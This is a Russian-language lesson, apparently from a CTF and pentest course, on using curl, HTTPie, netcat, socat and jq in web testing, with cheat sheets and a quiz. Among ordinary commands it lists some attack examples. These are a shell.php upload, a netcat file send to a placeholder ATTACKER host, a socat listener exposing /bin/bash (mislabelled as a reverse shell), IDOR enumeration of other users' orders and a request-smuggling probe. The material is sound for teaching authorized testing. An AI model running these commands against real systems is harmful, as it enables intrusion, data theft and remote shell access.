---
id: web-tools-cli
title: "CLI-инструменты: curl, HTTPie, netcat и socat"
category: web
parent: web-tooling
difficulty: easy
order: 1
tags: [curl, httpie, netcat, socat, cli, http, tooling]
prerequisites: [web-tooling]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
  - "Работа с API"
estimated_minutes: 45
summary: "Модуль-навигатор по консольным инструментам HTTP и сети: curl, HTTPie, netcat и socat — что делает каждый и как связать их в работе."
---

Командная строка — основной рабочий инструмент веб-тестировщика: то, что воспроизводится одной командой, становится PoC в отчёте. Этот урок — практический справочник по четырём ключевым CLI-инструментам: `curl` (HTTP-клиент), `HTTPie` (человекочитаемый HTTP), `netcat` (сырые TCP/UDP-соединения) и `socat` (продвинутые соединения и туннели). Плюс `jq` для разбора JSON.

## Когда какой инструмент

| Задача | Инструмент | Почему |
|--------|-----------|--------|
| Точное воспроизведение запроса / PoC | curl | полный контроль над байтами |
| Человекочитаемый ручной запрос | HTTPie | меньше флагов, цветной вывод |
| Сырое TCP/UDP, баннеры | netcat | работает на уровне сокета |
| Порт-форвард, SSL, несколько соединений | socat | мощнее nc |
| Разбор JSON-ответа | jq | фильтры и извлечение полей |

Правило: **Burp — чтобы найти, curl — чтобы доказать**. Нашли что-то в прокси — сразу воспроизводите curl (правый клик → *Copy as cURL*).

## curl: рабочие флаги

```bash
# базовые
curl -s https://t/                          # тихо
curl -si https://t/                         # заголовки + тело
curl -sI https://t/                         # только заголовки (HEAD)
curl -sL https://t/                         # следовать редиректам
curl -sk https://t/                         # игнорировать TLS

# методы и тело
curl -sX DELETE https://t/api/1
curl -s -d 'user=admin&pass=admin' https://t/login
curl -s -H 'Content-Type: application/json' -d '{"a":1}' https://t/api
curl -s -F 'file=@shell.php' https://t/up
curl -s -T file.txt https://t/upload        # PUT

# cookie и auth
curl -s -c jar.txt -b jar.txt https://t/    # cookie-jar
curl -s -u admin:pass https://t/admin
curl -s -H 'Authorization: Bearer eyJ...' https://t/me

# вывод и отладка
curl -s -o /tmp/body -w '%{http_code} %{size_download}\n' https://t/
curl -s -v https://t/api 2>&1 | head -40    # сырой обмен
curl -s --path-as-is 'https://t/a/../b'     # не нормализовать путь
curl -s --resolve t.local:443:10.0.0.5 https://t.local/
```

| Флаг | Что делает |
|------|-----------|
| `-s/-S` | тихо / показать ошибку |
| `-i/-I` | заголовки+тело / только заголовки |
| `-X` | метод |
| `-d/--data-raw` | тело (POST) |
| `-F` | multipart |
| `-b/-c` | cookie / cookie-jar |
| `-u` | Basic auth |
| `-x` | прокси (Burp) |
| `-w` | шаблон вывода |
| `--path-as-is` | не схлопывать `../` |

## HTTPie: читаемые запросы

HTTPie делает то же, но с приятным синтаксисом: `ключ=значение` для полей формы, `ключ:=json` для JSON.

```bash
# GET с query-параметрами
http GET https://t/api item==1 page==2

# POST JSON (ключ:=значение -> типизированный JSON)
http POST https://t/api name=bob role:=admin active:=true

# POST форму (Content-Type form по умолчанию с =)
http --form POST https://t/login user=admin pass=admin

# заголовки и auth
http GET https://t/me 'Authorization: Bearer eyJ...'
http -a admin:pass GET https://t/admin

# не отправлять, а показать запрос (offline)
http --offline POST https://t/api name=bob

# скачать файл
http --download https://t/file.zip
```

| Синтаксис | Значение |
|-----------|----------|
| `key=value` | строковое поле (форма/JSON) |
| `key:=value` | типизированное JSON-значение |
| `key==value` | query-параметр |
| `key:value` | заголовок |
| `Header:` | удалить заголовок |
| `--offline` | показать, но не слать |

## netcat: сырые соединения

`nc` работает на уровне TCP/UDP — это нужно для баннеров, ручных HTTP-запросов и простых listener'ов.

```bash
# баннер-граббинг
nc -nv 10.0.0.5 80
nc -nv 10.0.0.5 22

# ручной HTTP-запрос (проверка заголовков/смуглинга)
printf 'GET / HTTP/1.1\r\nHost: t\r\nConnection: close\r\n\r\n' | nc t 80

# listener для обратного соединения
nc -lvnp 4444
# передача файла
nc -lvnp 4444 > received.bin        # на приёмнике
nc -nv ATTACKER 4444 < file.bin     # на отправителе

# сканирование портов (медленно, но без nmap)
nc -zvw1 10.0.0.5 1-1000 2>&1 | grep succeeded
```

| Флаг | Значение |
|------|----------|
| `-l` | слушать |
| `-v` | подробно |
| `-n` | без DNS |
| `-p PORT` | локальный порт |
| `-z` | скан без отправки данных |
| `-w SEC` | таймаут |
| `-u` | UDP |

## socat: соединения и туннели

`socat` — «netcat на стероидах»: адреса, SSL, форварды, несколько соединений.

```bash
# listener
socat TCP-LISTEN:4444,reuseaddr,fork -

# порт-форвард (локальный -> удалённый)
socat TCP-LISTEN:8080,fork TCP:10.0.0.5:80

# SSL-соединение
socat - OPENSSL:t:443,verify=0

# реверс-шелл
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# прокси для доступа к внутреннему хосту
socat TCP-LISTEN:9000,fork TCP:internal.local:8080
```

| Адрес | Смысл |
|-------|-------|
| `TCP-LISTEN:PORT` | слушать TCP |
| `TCP:HOST:PORT` | подключиться TCP |
| `OPENSSL:HOST:PORT` | TLS-соединение |
| `EXEC:CMD` | выполнить команду |
| `,fork` | обрабатывать несколько соединений |
| `,reuseaddr` | переиспользовать адрес |

## jq: разбор JSON-ответов

```bash
curl -s https://t/api/users | jq '.users[].name'
curl -s https://t/api/item | jq 'keys'
curl -s https://t/api/me | jq '{id: .id, admin: .isAdmin}'
curl -s https://t/api/log | jq -r '.[] | select(.level=="error") | .msg'
```

## Разобранный пример: воспроизведение запроса из Burp

Нашли IDOR в Repeater. Переносим в терминал:

```bash
# 1. Copy as cURL из Burp -> сохраняем в request.sh
# 2. проверяем доступ к чужому объекту
curl -s 'https://t/api/orders/1002' -H 'Cookie: session=abc123' | jq '.user_id, .total'
"user_57"
"1299.00"

# 3. проверяем, что это действительно чужой объект (свой — 1001)
curl -s 'https://t/api/orders/1001' -H 'Cookie: session=abc123' | jq '.user_id'
"me"

# 4. теперь через HTTPie удобнее перебирать id
for i in $(seq 1001 1010); do
  http --quiet GET https://t/api/orders/$i 'Cookie: session=abc123' | jq -r '.user_id'
done
```

Артефакт — данные чужого пользователя (`user_57`), полученные с вашей сессией.

## Крайние случаи и подводные камни

- **Нормализация пути.** curl по умолчанию схлопывает `../`; для traversal-тестов нужен `--path-as-is`.
- **DNS и Host.** `--resolve` подменяет DNS, сохраняя SNI/Host — незаменимо для vhost.
- **HTTP/2.** `curl --http2-prior-knowledge` для h2c; для смуглинга важен явный `--http1.1`.
- **Cookie-банка.** `-c` сохраняет `Set-Cookie`, `-b` отправляет — это полноценная сессия.
- **nc без `-w`** может висеть вечно — всегда ставьте таймаут.
- **socat `fork`** нужен для нескольких соединений, иначе второй клиент отвалится.
- **jq и не-JSON.** Если ответ не JSON, `jq` упадёт — проверяйте Content-Type.

## Что делать дальше / решение

1. **Воспроизведение** — `curl` с флагами из Burp (*Copy as cURL*).
2. **Удобный ручной запрос** — `http`/`httpie`.
3. **Сырые сокеты и баннеры** — `nc`; **туннели/форварды** — `socat`.
4. **Разбор ответа** — `jq` для JSON, `grep` для текста.
5. **Тупик** — вернитесь к перехвату в Burp и посмотрите «что реально ушло» (`curl -v`).
6. **Фиксация** — сохраните рабочую команду как PoC в отчёт.

## Шпаргалка

| Задача | Команда |
|--------|---------|
| Код ответа | `curl -so /dev/null -w '%{http_code}' URL` |
| Заголовки | `curl -sI URL` |
| POST JSON | `curl -s -H 'Content-Type: application/json' -d '{...}' URL` |
| Загрузка файла | `curl -s -F 'file=@f' URL` |
| Сессия | `curl -s -c j -b j URL` |
| Через Burp | `curl -sk -x http://127.0.0.1:8080 URL` |
| Сырой HTTP | `printf 'GET / HTTP/1.1\r\nHost: t\r\n\r\n' \| nc t 80` |
| Форвард | `socat TCP-LISTEN:8080,fork TCP:host:80` |
| JSON-поле | `... \| jq '.field'` |

## CLI против графических инструментов

Burp и ZAP незаменимы для интерактивной работы: перехват, история, ручная правка, визуальный diff. Но у CLI есть свои преимущества, которые делают его обязательным в арсенале. Во-первых, **воспроизводимость**: команда `curl` — это точное описание запроса, которое можно вставить в отчёт, в скрипт или в тикет. Во-вторых, **автоматизация**: тысячи запросов в цикле, конвейеры `httpx | nuclei`, ночные прогоны. В-третьих, **отсутствие зависимостей**: `curl` есть везде, включая продовые контейнеры и CI, где графический прокси не поставишь.

Практический рабочий процесс строится так: **находите в Burp, доказываете в CLI**. Каждый интересный запрос из истории прокси конвертируется правым кликом в curl и сохраняется в файл. Так формируется «коллекция PoC» — набор команд, каждая из которых подтверждает конкретную уязвимость. Это же удобно для передачи задачи коллеге: вместо скриншота он получает команду, которая воспроизводит баг у него на машине.

Отдельно стоит упомянуть `jq` — без него разбор JSON-API превращается в боль. С его помощью вы фильтруете массивы, извлекаете поля, сравниваете ответы и строите компактные сводки. В связке `curl | jq` — это полноценный API-клиент.

## Работа с аутентификацией и сессиями

Большинство уязвимостей живёт за аутентификацией, поэтому умение «носить» сессию в CLI критично. Есть несколько техник, и их стоит знать наизусть.

Первая — **cookie-jar**. `curl -c jar.txt` сохраняет все `Set-Cookie`, `-b jar.txt` отправляет их обратно. Залогинились один раз — дальше все запросы идут от имени сессии. Вторая — **заголовок Authorization** для Bearer/JWT. Третья — **Basic/Digest** через `-u`. Четвёртая — **повторное использование токена** из ответа: часто токен приходит в JSON и его надо подставить в следующий запрос — тут помогает `jq -r`.

```bash
# 1. логин и сохранение сессии
curl -s -c jar.txt -X POST https://t/login -d 'user=admin&pass=admin' >/dev/null

# 2. запрос с сессией
curl -s -b jar.txt https://t/dashboard | grep -i welcome

# 3. Bearer-токен, извлечённый из JSON-ответа
TOKEN=$(curl -s -X POST https://t/api/token -d 'u=admin&p=x' | jq -r '.access_token')
curl -s https://t/api/me -H "Authorization: Bearer $TOKEN" | jq .

# 4. Basic + cookie одновременно
curl -s -u admin:pass -b jar.txt https://t/admin
```

Частая ошибка новичка — копировать cookie вручную и забывать про его истечение. Cookie-jar избавляет от этого: он сам обновляет значения. А для CSRF-сценариев помните, что `-c`/`-b` сохраняют и отправляют ровно те cookie, что и браузер, — это делает воспроизведение точным.

## Разобранный пример: сырой HTTP и request smuggling

Иногда нужен полный контроль над байтами запроса — например, для проверки request smuggling или нестандартных заголовков. `curl` нормализует запрос, а `netcat`/`socat` — нет.

```bash
# подозрение на CL.TE smuggling: два заголовка длины
printf 'POST / HTTP/1.1\r\nHost: t\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' \
  | nc -w3 t 80

# HTTP/2 prior knowledge через curl (без апгрейда)
curl -s --http2-prior-knowledge https://t/ -o /dev/null -w '%{http_version}\n'

# зафиксировать HTTP/1.1 для теста даунгрейда
curl -s --http1.1 https://t/
```

Сырой запрос через `nc` показывает, как сервер реально разбирает границу между запросами. Это единственный способ проверить смуглинг там, где клиент «улучшает» запрос. Если сервер отвечает на второй «спрятанный» запрос — десинхронизация подтверждена.

## Итог: как выбрать инструмент за пять секунд

- Нужно **доказать** баг в отчёте — `curl`.
- Нужно **быстро руками** посмотреть API — `httpie`.
- Нужен **сырой байт** на сокет — `nc`/`socat`.
- Нужен **форвард или туннель** — `socat`.
- Нужно **разобрать JSON** — `jq`.

Этих пяти инструментов достаточно, чтобы провести весь цикл веб-теста от разведки до PoC. Остальное (Burp, ffuf, sqlmap) — надстройки для конкретных задач, но база всегда CLI.

## Квиз

```quiz
- question: "Какой флаг curl отправляет multipart-форму с файлом?"
  options:
    - "-d"
    - "-F"
    - "-X"
    - "-b"
  answer: 1
  explanation: "-F (--form) собирает multipart/form-data и умеет @file для загрузки."
- question: "Каким инструментом удобнее всего принять входящее TCP-соединение для обратного шелла?"
  options:
    - "curl"
    - "HTTPie"
    - "netcat"
    - "nuclei"
  answer: 2
  explanation: "netcat (nc -lvnp) — классический слушатель для reverse shell; socat умеет то же плюс релеи."
- question: "Что делает связка `curl -c jar.txt -b jar.txt`?"
  options:
    - "Сжимает ответ gzip"
    - "Сохраняет cookie в файл и затем отправляет их из файла"
    - "Отключает проверку TLS"
    - "Отправляет POST вместо GET"
  answer: 1
  explanation: "-c пишет cookie-jar, -b читает из него — так держат сессию между запросами."
```

## Где пригодится

- **CTF (Web):** воспроизвести чужой запрос, дёрнуть API и приложить одну понятную команду как PoC.
- **Bug bounty:** платформы требуют reproducible PoC — curl из Burp закрывает это в один шаг.
- **Пентест:** сессионная работа, загрузка файлов, отладка заголовков и сырые TCP-пробы.
- **Работа (AppSec/DevSecOps):** тестирование API в CI и ручная проверка вебхуков/сервисов без GUI.
